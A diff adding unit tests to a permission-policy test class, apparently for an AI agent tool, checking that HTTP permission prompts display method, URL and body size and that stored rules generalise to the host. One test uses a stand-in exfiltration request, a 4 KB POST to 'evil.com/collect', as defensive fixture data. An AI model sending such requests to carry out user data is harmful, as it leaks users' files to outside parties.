@@ -770,4 +770,38 @@ public class PermissionPolicyTests
         Assert.Equal(PermissionKind.FileWrite, requests[0].Kind);
         Assert.Null(requests[0].AlwaysRule);   // nothing truthful to generalise
     }
+
+    [Fact]
+    public void AnHttpRequest_ShowsTheMethodPathAndBodySize()
+    {
+        // THE PROMPT ASKED A QUESTION IT DID NOT SHOW. "Allow a request to https://evil.com?" omits the
+        // part that decides the answer — whether this is reading docs or posting your files.
+        var reqs = PermissionPolicy.RequestsFor("http", Params(
+            ("url", "https://evil.com/collect?k=v"), ("method", "POST"), ("body", new string('x', 4096))));
+
+        var http = Assert.Single(reqs);
+
+        Assert.Contains("POST", http.Display);
+        Assert.Contains("https://evil.com/collect", http.Display);
+        Assert.Contains("4.0 KB", http.Display);
+    }
+
+    [Fact]
+    public void AnHttpRule_StillGeneralisesToTheOrigin()
+    {
+        // A STORED RULE MUST NOT NARROW. "Always allow api.github.com" was a grant for the host, and
+        // rewriting it per-path would silently invalidate every rule a user already has.
+        var reqs = PermissionPolicy.RequestsFor("http", Params(
+            ("url", "https://api.github.com/repos/x/y"), ("method", "GET")));
+
+        Assert.Equal("https://api.github.com", Assert.Single(reqs).AlwaysRule);
+    }
+
+    [Fact]
+    public void AGetWithNoBodySaysNothingAboutSize()
+    {
+        var reqs = PermissionPolicy.RequestsFor("http", Params(("url", "https://x.dev/a"), ("method", "GET")));
+
+        Assert.DoesNotContain("KB", Assert.Single(reqs).Display);
+    }
 }
